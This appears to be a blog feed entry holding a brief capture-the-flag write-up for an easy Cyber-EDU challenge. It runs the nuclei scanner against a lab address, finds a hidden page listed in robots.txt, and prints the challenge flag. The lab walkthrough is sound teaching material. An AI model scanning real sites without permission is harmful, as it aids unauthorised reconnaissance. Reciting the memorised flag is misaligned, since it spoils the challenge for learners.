        <content type="html"><![CDATA[<p><img src="/../images/robots.png" alt="alt text"></p><p>Challange Link from Cyber-EDU :<br><a href="https://app.cyber-edu.co/challenges/1e37bac0-44a5-11ed-b4d6-0f0819dfa676?tenant=cyberedu">https://app.cyber-edu.co/challenges/1e37bac0-44a5-11ed-b4d6-0f0819dfa676?tenant=cyberedu</a></p><h1 id="Robots-txt"><a href="#Robots-txt" class="headerlink" title="Robots.txt"></a>Robots.txt</h1><p>Robots.txt is a text file webmasters create to instruct web robots (typically search engine robots) how to crawl pages on their website. The robots.txt file is part of the the robots exclusion protocol (REP), a group of web standards that regulate how robots crawl the web, access and index content, and serve that content up to users. The REP also includes directives like meta robots, as well as page-, subdirectory-, or site-wide instructions for how search engines should treat links (such as “follow” or “nofollow”)c</p><h1 id="Walktrough"><a href="#Walktrough" class="headerlink" title="Walktrough"></a>Walktrough</h1><p>First we paste the address we got in our browser and this is what we get :  </p><p><img src="/../images/image.png" alt="alt text"></p><p>With a tool named <code>nuclei</code> we found a directory <code>robots.txt</code> :</p><pre><code class="hljs powershell">└─<span class="hljs-variable">$</span> nuclei <span class="hljs-literal">-u</span> http://<span class="hljs-number">34.159</span>.<span class="hljs-number">76.30</span>:<span class="hljs-number">31714</span>/</code></pre><p>Found:<br><code>[robots-txt-endpoint] [http] [info] http://34.159.76.30:31714/robots.txt</code></p><p>Let’s try to go into <code>/robots.txt</code> :</p><p><img src="/../images/Screenshot%202024-04-07%20at%2010.25.39.png" alt="alt text"></p><p>We found something interesting &#x2F;g00d_old_mus1c.php , if we dig deep and go into that let’s see what we find :</p><p><img src="/../images/Screenshot%202024-04-07%20at%2010.45.13.png" alt="alt text"></p><p>And we got the Flag : <code>CTF&#123;Kr4ftw3rk_4nd_th3_r0b0ts&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Easy </tag>
            
            <tag> ROCSC </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
